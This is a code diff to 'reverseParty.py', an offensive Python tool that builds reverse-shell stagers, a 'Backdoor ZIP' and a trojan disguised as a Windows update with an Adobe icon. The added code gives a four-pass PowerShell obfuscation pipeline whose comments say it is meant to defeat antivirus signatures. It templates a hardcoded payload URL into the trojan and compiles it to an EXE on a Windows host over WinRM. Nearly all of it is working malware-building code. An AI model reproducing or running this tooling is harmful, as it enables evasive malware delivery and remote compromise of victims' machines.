@@ -19,7 +19,7 @@ Directory structure expected:
       ├── second-stage/        (clear-text reverse shell files)
       ├── stager/              (clear-text stager files)
       ├── out/                 (output - gets cleared each run)
-      ├── stuff/               (support files: LAUNCHERNAME etc.)
+      ├── stuff/               (support files: LAUNCHERNAME, TROJANNAME etc.)
       └── listener/            (listener scripts)
 
 Dependencies:
@@ -35,7 +35,7 @@ import shutil
 import base64
 import zipfile
 
-# Optional WinRM dependency - imported lazily in step 4
+# Optional WinRM dependency - imported lazily in step 4 / step 7
 try:
     import winrm
     WINRM_AVAILABLE = True
@@ -62,7 +62,8 @@ WIN_PASS     = "Passw0rd!"
 TROJAN_FE    = "update_k897867.msu"
 ICONNAME     = "adobe.ico"
 TROJANNAME   = "installer.ps1"
-TROJAN_URL   = "https://raw.githubusercontent.com/dokDork/dokDork.github.io/main/soloemapuoaccedere"
+# TROJAN_URL   = "https://raw.githubusercontent.com/dokDork/dokDork.github.io/main/soloemapuoaccedere"
+TROJAN_URL   = "http://151.61.206.201"
 
 # ==============================================================================
 # END OF USER-CONFIGURABLE VARIABLES
@@ -146,6 +147,19 @@ def write_file(path: str, content: str):
 # ==============================================================================
 
 def obfuscate_variables(content: str, hex_pool: list, used_hex: set) -> tuple:
+    """
+    Identifies PowerShell user-defined variables via the pattern $name=
+    (i.e. assignment operator immediately follows the name, with optional
+    whitespace).  Environment / automatic variables are NOT touched because
+    they either never appear in assignment form or are filtered by context.
+
+    Rules enforced:
+      - Token must start with '$'
+      - Token must end with '=' (assignment context)
+      - The bare name must not already be a hex string (idempotent)
+      - Each original name gets one unique UUID-hex replacement; the same hex
+        token is NEVER reused for a different variable.
+    """
     pattern = re.compile(r'\$([A-Za-z_][A-Za-z0-9_]*)\s*=')
     var_names = set(pattern.findall(content))
 
@@ -175,10 +189,27 @@ def obfuscate_variables(content: str, hex_pool: list, used_hex: set) -> tuple:
 # ==============================================================================
 
 def _insert_junk_between_chars(word: str) -> str:
+    """
+    Method 1 — Quote injection.
+    Inserts '' between letters of a PowerShell keyword so that the shell
+    still executes the command while confusing signature scanners.
+
+    Constraints:
+      - At most ONE separator is placed between any two adjacent characters
+        (prevents generating who''''ami).
+      - Between 1 and (len-1) positions are selected at random.
+
+    BUG FIX — only '' (single-quote pairs), never "" (double-quote pairs):
+    If "" were injected inside a keyword (e.g. St""art-Process), Pass 3 would
+    later misinterpret those double quotes as string delimiters and corrupt the
+    token into something like St""("art-P""roc")...  Using only '' avoids this
+    entirely because Pass 3 exclusively scans for double-quote delimited strings.
+    """
     if len(word) <= 1:
         return word
 
-    separators = ["''", '""']
+    # FIX: single-quote pairs only — never double-quote pairs.
+    separators = ["''"]
     chars = list(word)
     max_insertions = len(chars) - 1
     n_insertions = random.randint(1, max_insertions)
@@ -196,6 +227,25 @@ def _insert_junk_between_chars(word: str) -> str:
 
 
 def obfuscate_ps_commands(content: str, ps_cmd_file: str) -> str:
+    """
+    Pass 2 — applies Method 1 (quote injection) to every PowerShell keyword
+    found in ps_cmd_file that also appears in content.
+
+    Processing order: longest keyword first (prevents partial replacements
+    when one keyword is a prefix of another).
+
+    Skipped tokens:
+      - Commands starting with '.' (dot-source operator)
+      - Commands starting with ':' (label)
+      - Commands starting with '(' (expression grouping)
+
+    BUG FIX — closure capture:
+    The inner 'replacer' function is defined with a default-argument capture
+    (_cmd=cmd) to prevent the classic Python late-binding closure bug where
+    all loop iterations share the last value of 'cmd'.  Although 'cmd' is not
+    currently used inside the function body (match.group(0) is used instead),
+    the explicit capture guards against future refactoring regressions.
+    """
     if not os.path.isfile(ps_cmd_file):
         warn(f"PS command list not found: {ps_cmd_file} — skipping pass 2.")
         return content
@@ -213,7 +263,8 @@ def obfuscate_ps_commands(content: str, ps_cmd_file: str) -> str:
             re.IGNORECASE
         )
 
-        def replacer(match):
+        # FIX: default-argument capture to avoid late-binding closure bug
+        def replacer(match, _cmd=cmd):
             return _insert_junk_between_chars(match.group(0))
 
         content = pattern.sub(replacer, content)
@@ -222,7 +273,119 @@ def obfuscate_ps_commands(content: str, ps_cmd_file: str) -> str:
 
 
 # ==============================================================================
-# OBFUSCATION PIPELINE
+# OBFUSCATION — PASS 3 (T-application only): String concatenation split
+# ==============================================================================
+
+def obfuscate_string_concat(content: str) -> str:
+    """
+    Pass 3 — String concatenation split (applied to T-application only).
+
+    Splits double-quoted string literals by inserting a '+' concatenation
+    operator at a random position:
+        "malicious payload"  →  ("malicious "+"payload")
+
+    This breaks naive string-literal matching by AV engines without altering
+    runtime behaviour.
+
+    BUG FIXES (3 issues vs original implementation):
+
+    1. CORRUPTION CAUSED BY PASS-2 REMNANTS
+       Root cause: Pass 2 originally injected "" (double-quote pairs) inside
+       keywords, creating spurious " characters.  For example, after Pass 2
+       the token Start-Process could become St""art-Process.  Pass 3's regex
+       r'"([^"\r\n]{5,})"' would then find "art-Process" between those quotes
+       and corrupt it into ("art-P"+"rocess"), producing the observed output
+       St""("art-P""roc")...
+       Fix: Pass 2 now uses ONLY '' (see _insert_junk_between_chars).  This
+       pass also adds the pure-letter filter below as a second line of defence.
+
+    2. TECHNICAL STRINGS INCORRECTLY SPLIT
+       The original regex accepted any 5+ char content, corrupting:
+         - IP addresses:    "151.61.206.201" → ("151.61.20"+"6.201")
+         - HTTP headers:    "User-Agent"     → ("User-A"+"gent")
+         - File names:      "wusa.exe"       → ("wusa.e"+"xe")
+         - Format strings:  "HH:mm:ss"       → ("HH:mm"+"ss")
+         - .NET namespaces, paths, URLs, etc.
+       Fix: only split strings whose content consists exclusively of ASCII
+       letters (a-z, A-Z) and spaces.  Any other character causes a skip.
+
+    3. MISSING '+' OPERATOR IN OUTPUT
+       The original code produced ("left""right") — two adjacent quoted strings
+       with no operator — which is a PS syntax error.
+       Fix: always emit the explicit '+' operator: ("left"+"right").
+    """
+    def split_string(m):
+        s = m.group(1)
+
+        # Minimum usable length (2 chars on each side of the cut)
+        if len(s) <= 6:
+            return m.group(0)
+
+        # FIX: accept ONLY pure-letter (+ optional space) content.
+        # Rejects IPs, URLs, file names, HTTP headers, .NET namespaces,
+        # format strings, paths, and anything else with non-alpha characters.
+        if re.search(r'[^A-Za-z ]', s):
+            return m.group(0)
+
+        # Ensure stripped content is still long enough
+        if len(s.strip()) <= 6:
+            return m.group(0)
+
+        # Random split with 2-char minimum margin on each side
+        cut = random.randint(2, len(s) - 2)
+        left  = s[:cut]
+        right = s[cut:]
+        # FIX: explicit '+' operator between the two halves
+        return f'("{left}"' + f'+"{right}")'
+
+    pattern = re.compile(r'"([^"\r\n]{5,})"')
+    return pattern.sub(split_string, content)
+
+
+# ==============================================================================
+# OBFUSCATION — PASS 4 (T-application only): Random case mangling of keywords
+# ==============================================================================
+
+def obfuscate_case_mangle(content: str, ps_cmd_file: str) -> str:
+    """
+    Pass 4 — Case mangling (applied to T-application only).
+
+    PowerShell is case-insensitive, so randomly alternating the case of each
+    character in a keyword defeats case-sensitive pattern matching.
+
+    Example:
+        New-Object  →  nEw-oBjEcT
+
+    Keywords starting with '.', ':' or '(' are skipped (same rule as Pass 2).
+    """
+    if not os.path.isfile(ps_cmd_file):
+        warn(f"PS command list not found: {ps_cmd_file} — skipping case mangle pass.")
+        return content
+
+    raw      = read_file(ps_cmd_file).splitlines()
+    commands = [c.strip() for c in raw if c.strip()]
+    commands.sort(key=len, reverse=True)
+
+    def random_case(word: str) -> str:
+        return "".join(
+            c.upper() if random.random() > 0.5 else c.lower()
+            for c in word
+        )
+
+    for cmd in commands:
+        if cmd.startswith('.') or cmd.startswith(':') or cmd.startswith('('):
+            continue
+        pattern = re.compile(
+            r'(?<![.\:\(\$A-Za-z0-9_])' + re.escape(cmd) + r'(?![A-Za-z0-9_])',
+            re.IGNORECASE
+        )
+        content = pattern.sub(lambda m: random_case(m.group(0)), content)
+
+    return content
+
+
+# ==============================================================================
+# OBFUSCATION PIPELINE (shared by steps 2 & 3)
 # ==============================================================================
 
 def full_obfuscation_pipeline(content: str, label: str) -> str:
@@ -238,13 +401,70 @@ def full_obfuscation_pipeline(content: str, label: str) -> str:
     else:
         info(f"  [{label}] No assignable user-defined variables found.")
 
-    info(f"  [{label}] Pass 2: Obfuscating PS command tokens (Method 1 — quote injection)...")
+    info(f"  [{label}] Pass 2: Obfuscating PS command tokens (Method 1 — '' injection)...")
     before = content
     content = obfuscate_ps_commands(content, PS_CMD_FILE)
     if content != before:
-        ok(f"  [{label}] PS command tokens obfuscated with '' / \"\" insertions.")
+        ok(f"  [{label}] PS command tokens obfuscated with '' insertions.")
     else:
         info(f"  [{label}] No matching PS command tokens found for quote injection.")
+
+    return content
+
+
+# ==============================================================================
+# OBFUSCATION PIPELINE — EXTENDED (used by step 6 for T-application)
+# ==============================================================================
+
+def full_obfuscation_pipeline_extended(content: str, label: str) -> str:
+    """
+    Extended 4-pass obfuscation pipeline applied exclusively to the
+    T-application (TROJANNAME).
+
+    Pass 1 — Variable renaming (UUID hex tokens)
+    Pass 2 — PS command '' injection (single-quote pairs only)
+    Pass 3 — String literal split (pure-letter strings only, explicit '+')
+    Pass 4 — Random case mangling of remaining PS keywords
+    """
+    hex_pool = generate_hex_pool(120)
+    used_hex = set()
+
+    # --- Pass 1: Variable renaming ---
+    info(f"  [{label}] Pass 1: Renaming user-defined variables with UUID hex tokens...")
+    content, var_map = obfuscate_variables(content, hex_pool, used_hex)
+    if var_map:
+        ok(f"  [{label}] Renamed {len(var_map)} variable(s):")
+        for orig, new in var_map.items():
+            print(f"             ${orig}  →  ${new}")
+    else:
+        info(f"  [{label}] No assignable user-defined variables found.")
+
+    # --- Pass 2: Quote injection ('' only) ---
+    info(f"  [{label}] Pass 2: Obfuscating PS command tokens (Method 1 — '' injection)...")
+    before = content
+    content = obfuscate_ps_commands(content, PS_CMD_FILE)
+    if content != before:
+        ok(f"  [{label}] PS command tokens obfuscated with '' insertions.")
+    else:
+        info(f"  [{label}] No matching PS command tokens found for quote injection.")
+
+    # --- Pass 3: String concatenation split (pure-letter strings only) ---
+    info(f"  [{label}] Pass 3: String literal split (pure-letter strings only)...")
+    before = content
+    content = obfuscate_string_concat(content)
+    if content != before:
+        ok(f"  [{label}] String literals split with '+' concatenation operator.")
+    else:
+        info(f"  [{label}] No eligible pure-letter string literals found.")
+
+    # --- Pass 4: Random case mangling ---
+    info(f"  [{label}] Pass 4: Random case mangling of remaining PS keywords...")
+    before = content
+    content = obfuscate_case_mangle(content, PS_CMD_FILE)
+    if content != before:
+        ok(f"  [{label}] PS keywords case-mangled (random upper/lower per character).")
+    else:
+        info(f"  [{label}] No remaining plaintext PS keywords found for case mangling.")
 
     return content
 
@@ -430,46 +650,47 @@ def step4_convert_stager_to_exe():
         )
         return
 
+    # CHUNK_SIZE = 500 (safe WinRM per-command payload size).
+    # WinRM/WSMan has an internal per-command payload limit much smaller than
+    # the Windows CLI limit (8191 chars): passing the b64 string inline inside
+    # Set-Content / Add-Content causes "La riga di comando è troppo lunga"
+    # even with 4000-char chunks.  500 chars fits inside every known WinRM limit.
+    # Each chunk is wrapped in a PS here-string (@'...'@) to avoid quoting issues
+    # with the base64 alphabet (+, /, =).
     info(f"Uploading {STAGERNAME} to Windows %TEMP% directory (chunked transfer)...")
     try:
         with open(stager_local, "rb") as f:
             file_bytes = f.read()
         b64_full  = base64.b64encode(file_bytes).decode("ascii")
 
-        # Chunk size chosen to keep each WinRM command well below the
-        # ~8 000-char command-line limit (conservative: 4 000 b64 chars ~ 3 KB raw).
-        CHUNK_SIZE = 4000
+        CHUNK_SIZE = 500
         chunks     = [b64_full[i:i + CHUNK_SIZE]
                       for i in range(0, len(b64_full), CHUNK_SIZE)]
         remote_b64 = f"$env:TEMP\\{STAGERNAME}.b64"
         remote_dst = f"$env:TEMP\\{STAGERNAME}"
 
-        info(f"  File size: {{len(file_bytes):,}} bytes  ->  "
-             f"{{len(chunks)}} chunk(s) of up to {{CHUNK_SIZE}} b64 chars each.")
+        info(f"  File size: {len(file_bytes):,} bytes  →  "
+             f"{len(chunks)} chunk(s) of up to {CHUNK_SIZE} b64 chars each.")
 
-        # First chunk: create (overwrite) the temp b64 file on the remote host
         init_ps = (
-            f"Set-Content -Path \"{remote_b64}\" "
-            f"-Value \'{chunks[0]}\' -Encoding ASCII;\n"
-            f"Write-Output \'Chunk 1 OK\'"
+            f"$chunk = @'\n{chunks[0]}\n'@\n"
+            f"Set-Content -Path \"{remote_b64}\" -Value $chunk.Trim() -Encoding ASCII\n"
+            f"Write-Output 'Chunk 1 OK'"
         )
         result = session.run_ps(init_ps)
         if result.status_code != 0:
             raise RuntimeError(result.std_err.decode(errors="replace"))
 
-        # Remaining chunks: append to the temp b64 file
         for idx, chunk in enumerate(chunks[1:], start=2):
             append_ps = (
-                f"Add-Content -Path \"{remote_b64}\" "
-                f"-Value \'{chunk}\' -Encoding ASCII;\n"
-                f"Write-Output \'Chunk {{idx}} OK\'"
+                f"$chunk = @'\n{chunk}\n'@\n"
+                f"Add-Content -Path \"{remote_b64}\" -Value $chunk.Trim() -Encoding ASCII\n"
+                f"Write-Output 'Chunk {idx} OK'"
             )
             result = session.run_ps(append_ps)
             if result.status_code != 0:
                 raise RuntimeError(result.std_err.decode(errors="replace"))
 
-        # Decode the assembled b64 file into the final PS1
-        # Note: PowerShell backtick escapes (`r, `n) are passed as literal strings
         _bt_r = "`r"
         _bt_n = "`n"
         decode_ps = (
@@ -485,7 +706,7 @@ def step4_convert_stager_to_exe():
             raise RuntimeError(result.std_err.decode(errors="replace"))
 
         ok(f"File {STAGERNAME} uploaded to remote %TEMP% successfully "
-           f"({{len(chunks)}} chunk(s)).")
+           f"({len(chunks)} chunk(s) × {CHUNK_SIZE} b64 chars).")
     except Exception as e:
         err_nonfatal(
             f"Failed to upload {STAGERNAME} to {WIN_IP}: {e}\n"
@@ -493,7 +714,6 @@ def step4_convert_stager_to_exe():
             f"Continuing...{RESET}"
         )
         return
-
 
     info(f"Running Invoke-ps2exe: {STAGERNAME} → {EXENAME}...")
     try:
@@ -562,14 +782,9 @@ def step5_create_zip():
 
     Actions performed:
       5a. Verify that the stager EXE (EXENAME) exists in out/.
-          If missing → dark-red error, skip step.
       5b. Verify that the launcher file (LAUNCHERNAME) exists in stuff/.
-          If missing → dark-red error, skip step.
-      5c. Create ZIPNAME inside out/, adding:
-            - EXENAME      (the compiled stager EXE from out/)
-            - LAUNCHERNAME (from stuff/)
-          Both files are stored at the root of the ZIP (no directory prefix).
-      5d. On success, print the green deployment reminders for the operator.
+      5c. Create ZIPNAME inside out/ with EXENAME and LAUNCHERNAME at archive root.
+      5d. Print deployment reminders.
     """
     section("STEP 5 — ZIP Creation (Launcher + Stager EXE)")
 
@@ -577,7 +792,6 @@ def step5_create_zip():
     launcher_local = os.path.join(STUFF_DIR, LAUNCHERNAME)
     zip_local      = os.path.join(OUT_DIR, ZIPNAME)
 
-    # 5a. Check stager EXE
     if not os.path.isfile(exe_local):
         err_nonfatal(
             f"Stager EXE not found: {exe_local}\n"
@@ -586,7 +800,6 @@ def step5_create_zip():
         )
         return
 
-    # 5b. Check launcher file
     if not os.path.isfile(launcher_local):
         err_nonfatal(
             f"Launcher file not found: {launcher_local}\n"
@@ -595,7 +808,6 @@ def step5_create_zip():
         )
         return
 
-    # 5c. Create ZIP with EXENAME and LAUNCHERNAME at archive root
     info(f"Creating ZIP archive: {zip_local}")
     info(f"  Adding: {EXENAME}       (from out/)")
     info(f"  Adding: {LAUNCHERNAME}  (from stuff/)")
@@ -612,7 +824,6 @@ def step5_create_zip():
         )
         return
 
-    # 5d. Deployment reminders
     print()
     print(f"  {GREEN_DARK}{'─' * 64}{RESET}")
     print(f"  {GREEN_DARK}  DEPLOYMENT REMINDERS:{RESET}")
@@ -627,6 +838,242 @@ def step5_create_zip():
 
 
 # ==============================================================================
+# STEP 6 — T-APPLICATION OBFUSCATION
+# ==============================================================================
+
+def step6_obfuscate_trojan():
+    """
+    STEP 6: Obfuscate the T-application (TROJANNAME).
+
+    Actions performed:
+      6a. Copy TROJAN_FE and TROJANNAME from stuff/ to out/.
+      6b. Substitute placeholders: [TROJAN-URL], [TROJAN_FE], [STAGERNAME].
+      6c. Apply the extended 4-pass obfuscation pipeline on TROJANNAME.
+    """
+    section("STEP 6 — T-Application Obfuscation")
+
+    trojan_fe_src  = os.path.join(STUFF_DIR, TROJAN_FE)
+    trojan_fe_dest = os.path.join(OUT_DIR,   TROJAN_FE)
+    if not os.path.isfile(trojan_fe_src):
+        err(
+            f"T-application source file not found: {trojan_fe_src}\n"
+            f"Ensure '{TROJAN_FE}' exists inside the stuff/ directory."
+        )
+    info(f"Copying '{TROJAN_FE}' from stuff/ to out/ ...")
+    shutil.copy2(trojan_fe_src, trojan_fe_dest)
+    ok(f"Copied: {trojan_fe_src}  →  {trojan_fe_dest}")
+
+    trojan_src  = os.path.join(STUFF_DIR, TROJANNAME)
+    trojan_dest = os.path.join(OUT_DIR,   TROJANNAME)
+    if not os.path.isfile(trojan_src):
+        err(
+            f"T-application source file not found: {trojan_src}\n"
+            f"Ensure '{TROJANNAME}' exists inside the stuff/ directory."
+        )
+    info(f"Copying '{TROJANNAME}' from stuff/ to out/ ...")
+    shutil.copy2(trojan_src, trojan_dest)
+    ok(f"Copied: {trojan_src}  →  {trojan_dest}")
+
+    info("Substituting placeholders [TROJAN-URL], [TROJAN_FE] and [STAGERNAME]...")
+    content = read_file(trojan_dest)
+
+    n_url    = content.count("[TROJAN-URL]")
+    n_fe     = content.count("[TROJAN_FE]")
+    n_stager = content.count("[STAGERNAME]")
+
+    content = content.replace("[TROJAN-URL]", TROJAN_URL)
+    content = content.replace("[TROJAN_FE]",  TROJAN_FE)
+    content = content.replace("[STAGERNAME]", STAGERNAME)
+
+    write_file(trojan_dest, content)
+    ok(f"Replaced {n_url} occurrence(s) of [TROJAN-URL]  → '{TROJAN_URL}'.")
+    ok(f"Replaced {n_fe} occurrence(s) of [TROJAN_FE]   → '{TROJAN_FE}'.")
+    ok(f"Replaced {n_stager} occurrence(s) of [STAGERNAME] → '{STAGERNAME}'.")
+
+    info("Starting EXTENDED obfuscation pipeline (4 passes) on T-application...")
+    content = read_file(trojan_dest)
+    content = full_obfuscation_pipeline_extended(content, label="trojan")
+    write_file(trojan_dest, content)
+
+    ok(f"T-application obfuscation complete. Output: {trojan_dest}")
+
+
+# ==============================================================================
+# STEP 7 — T-APPLICATION PS1 → EXE CONVERSION VIA WINRM
+# ==============================================================================
+
+def step7_convert_trojan_to_exe():
+    """
+    STEP 7: Convert the obfuscated T-application PS1 to a Windows EXE via WinRM.
+
+    Actions performed:
+      7a. Check pywinrm availability; if missing → non-fatal error, skip step.
+      7b. Establish WinRM session (NTLM). On failure → non-fatal error, skip.
+      7c. Upload out/TROJANNAME via chunked base64 (CHUNK_SIZE=500, here-strings).
+      7d. Run Invoke-ps2exe remotely.
+      7e. Download resulting EXE to out/TROJANNAME.exe.
+      7f. Clean up remote %TEMP% files.
+    """
+    section("STEP 7 — T-Application PS1 → EXE Conversion via WinRM")
+
+    trojan_local     = os.path.join(OUT_DIR, TROJANNAME)
+    trojan_exe_name  = TROJANNAME + ".exe"
+    trojan_exe_local = os.path.join(OUT_DIR, trojan_exe_name)
+
+    # 7a. Check pywinrm
+    if not WINRM_AVAILABLE:
+        err_nonfatal(
+            "The 'pywinrm' library is not installed. "
+            "Run: pip install pywinrm\n"
+            f"  {RED_DARK}The T-application EXE ({trojan_exe_name}) will NOT be generated. "
+            f"Continuing...{RESET}"
+        )
+        return
+
+    # 7b. Establish WinRM session
+    info(f"Connecting to Windows machine at {WIN_IP} via WinRM (user: {WIN_USER})...")
+    try:
+        session = winrm.Session(
+            f"http://{WIN_IP}:5985/wsman",
+            auth=(WIN_USER, WIN_PASS),
+            transport="ntlm",
+            read_timeout_sec=30,
+            operation_timeout_sec=25,
+        )
+        result = session.run_ps("$env:COMPUTERNAME")
+        if result.status_code != 0:
+            raise RuntimeError(result.std_err.decode(errors="replace"))
+        hostname = result.std_out.decode(errors="replace").strip()
+        ok(f"Connected to Windows machine: {hostname} ({WIN_IP})")
+    except Exception as e:
+        err_nonfatal(
+            f"Could not connect to {WIN_IP} via WinRM: {e}\n"
+            f"  {RED_DARK}The T-application EXE ({trojan_exe_name}) will NOT be generated. "
+            f"Continuing...{RESET}"
+        )
+        return
+
+    # 7c. Upload TROJANNAME (chunked base64, CHUNK_SIZE=500, here-string encoding)
+    info(f"Uploading '{TROJANNAME}' to Windows %TEMP% directory (chunked transfer)...")
+    try:
+        with open(trojan_local, "rb") as f:
+            file_bytes = f.read()
+
+        b64_full   = base64.b64encode(file_bytes).decode("ascii")
+        CHUNK_SIZE = 500
+        chunks     = [b64_full[i:i + CHUNK_SIZE]
+                      for i in range(0, len(b64_full), CHUNK_SIZE)]
+        remote_b64 = f"$env:TEMP\\{TROJANNAME}.b64"
+        remote_dst = f"$env:TEMP\\{TROJANNAME}"
+
+        info(f"  File size: {len(file_bytes):,} bytes  →  "
+             f"{len(chunks)} chunk(s) of up to {CHUNK_SIZE} b64 chars each.")
+
+        init_ps = (
+            f"$chunk = @'\n{chunks[0]}\n'@\n"
+            f"Set-Content -Path \"{remote_b64}\" -Value $chunk.Trim() -Encoding ASCII\n"
+            f"Write-Output 'Chunk 1 OK'"
+        )
+        result = session.run_ps(init_ps)
+        if result.status_code != 0:
+            raise RuntimeError(result.std_err.decode(errors="replace"))
+
+        for idx, chunk in enumerate(chunks[1:], start=2):
+            append_ps = (
+                f"$chunk = @'\n{chunk}\n'@\n"
+                f"Add-Content -Path \"{remote_b64}\" -Value $chunk.Trim() -Encoding ASCII\n"
+                f"Write-Output 'Chunk {idx} OK'"
+            )
+            result = session.run_ps(append_ps)
+            if result.status_code != 0:
+                raise RuntimeError(result.std_err.decode(errors="replace"))
+
+        _bt_r = "`r"
+        _bt_n = "`n"
+        decode_ps = (
+            f'$b64 = (Get-Content -Path "{remote_b64}" -Raw)'
+            f' -replace "{_bt_r}",\'\' -replace "{_bt_n}",\'\';\n'
+            f'$bytes = [System.Convert]::FromBase64String($b64);\n'
+            f'[System.IO.File]::WriteAllBytes("{remote_dst}", $bytes);\n'
+            f'Remove-Item "{remote_b64}" -Force -EA 0;\n'
+            f"Write-Output 'Decode OK'"
+        )
+        result = session.run_ps(decode_ps)
+        if result.status_code != 0:
+            raise RuntimeError(result.std_err.decode(errors="replace"))
+
+        ok(f"'{TROJANNAME}' uploaded to remote %TEMP% successfully "
+           f"({len(chunks)} chunk(s) × {CHUNK_SIZE} b64 chars).")
+    except Exception as e:
+        err_nonfatal(
+            f"Failed to upload '{TROJANNAME}' to {WIN_IP}: {e}\n"
+            f"  {RED_DARK}The T-application EXE ({trojan_exe_name}) will NOT be generated. "
+            f"Continuing...{RESET}"
+        )
+        return
+
+    # 7d. Run Invoke-ps2exe
+    info(f"Running Invoke-ps2exe: {TROJANNAME} → {trojan_exe_name}...")
+    try:
+        convert_ps = (
+            f"Invoke-ps2exe \"$env:TEMP\\{TROJANNAME}\" "
+            f"\"$env:TEMP\\{trojan_exe_name}\";\n"
+            f"if (Test-Path \"$env:TEMP\\{trojan_exe_name}\") "
+            f"{{ Write-Output 'Conversion OK' }} "
+            f"else {{ Write-Error 'EXE not created' }}"
+        )
+        result = session.run_ps(convert_ps)
+        if result.status_code != 0:
+            raise RuntimeError(result.std_err.decode(errors="replace"))
+        ok(f"Invoke-ps2exe completed. Remote EXE: %TEMP%\\{trojan_exe_name}")
+    except Exception as e:
+        err_nonfatal(
+            f"ps2exe conversion failed on {WIN_IP}: {e}\n"
+            f"  {RED_DARK}Ensure ps2exe is installed on the Windows machine "
+            f"(Install-Module ps2exe).\n"
+            f"  The T-application EXE ({trojan_exe_name}) will NOT be generated. "
+            f"Continuing...{RESET}"
+        )
+        session.run_ps(f"Remove-Item \"$env:TEMP\\{TROJANNAME}\" -Force -EA 0")
+        return
+
+    # 7e. Download EXE
+    info(f"Downloading '{trojan_exe_name}' from Windows %TEMP% to local out/ ...")
+    try:
+        download_ps = (
+            f"$bytes = [System.IO.File]::ReadAllBytes(\"$env:TEMP\\{trojan_exe_name}\");\n"
+            f"[System.Convert]::ToBase64String($bytes)"
+        )
+        result = session.run_ps(download_ps)
+        if result.status_code != 0:
+            raise RuntimeError(result.std_err.decode(errors="replace"))
+        b64_exe   = result.std_out.decode(errors="replace").strip()
+        exe_bytes = base64.b64decode(b64_exe)
+        with open(trojan_exe_local, "wb") as f:
+            f.write(exe_bytes)
+        ok(f"EXE downloaded: {trojan_exe_local} ({len(exe_bytes):,} bytes)")
+    except Exception as e:
+        err_nonfatal(
+            f"Failed to download '{trojan_exe_name}' from {WIN_IP}: {e}\n"
+            f"  {RED_DARK}The T-application EXE will NOT be available locally. "
+            f"Continuing...{RESET}"
+        )
+
+    # 7f. Remote cleanup
+    info("Cleaning up temporary files from Windows %TEMP%...")
+    try:
+        cleanup_ps = (
+            f"Remove-Item \"$env:TEMP\\{TROJANNAME}\" -Force -EA 0;\n"
+            f"Remove-Item \"$env:TEMP\\{trojan_exe_name}\" -Force -EA 0;\n"
+            f"Write-Output 'Cleanup OK'"
+        )
+        session.run_ps(cleanup_ps)
+        ok("Remote temporary files cleaned up.")
+    except Exception:
+        warn("Could not clean up temporary files on the Windows machine.")
+
+
+# ==============================================================================
 # MAIN
 # ==============================================================================
 
@@ -637,23 +1084,40 @@ def main():
     step3_obfuscate_stager()
     step4_convert_stager_to_exe()
     step5_create_zip()
+    step6_obfuscate_trojan()
+    step7_convert_trojan_to_exe()
 
     section("ALL STEPS COMPLETED")
     ok("reverseParty.py finished successfully.")
     print()
-    info(f"Output directory : {OUT_DIR}")
-    info(f"Second stage     : {os.path.join(OUT_DIR, SECONDNAME)}")
-    info(f"Stager (PS1)     : {os.path.join(OUT_DIR, STAGERNAME)}")
+    info(f"Output directory      : {OUT_DIR}")
+    info(f"Second stage          : {os.path.join(OUT_DIR, SECONDNAME)}")
+    info(f"Stager (PS1)          : {os.path.join(OUT_DIR, STAGERNAME)}")
+
     exe_path = os.path.join(OUT_DIR, EXENAME)
     if os.path.isfile(exe_path):
-        info(f"Stager (EXE)     : {exe_path}")
+        info(f"Stager (EXE)          : {exe_path}")
     else:
-        warn(f"Stager (EXE)     : not generated (see Step 4 output above)")
+        warn(f"Stager (EXE)          : not generated (see Step 4 output above)")
+
     zip_path = os.path.join(OUT_DIR, ZIPNAME)
     if os.path.isfile(zip_path):
-        info(f"Backdoor ZIP     : {zip_path}")
+        info(f"Backdoor ZIP          : {zip_path}")
     else:
-        warn(f"Backdoor ZIP     : not generated (see Step 5 output above)")
+        warn(f"Backdoor ZIP          : not generated (see Step 5 output above)")
+
+    trojan_path = os.path.join(OUT_DIR, TROJANNAME)
+    if os.path.isfile(trojan_path):
+        info(f"T-application (PS1)   : {trojan_path}")
+    else:
+        warn(f"T-application (PS1)   : not generated (see Step 6 output above)")
+
+    trojan_exe_path = os.path.join(OUT_DIR, TROJANNAME + ".exe")
+    if os.path.isfile(trojan_exe_path):
+        info(f"T-application (EXE)   : {trojan_exe_path}")
+    else:
+        warn(f"T-application (EXE)   : not generated (see Step 7 output above)")
+
     print()
 
 
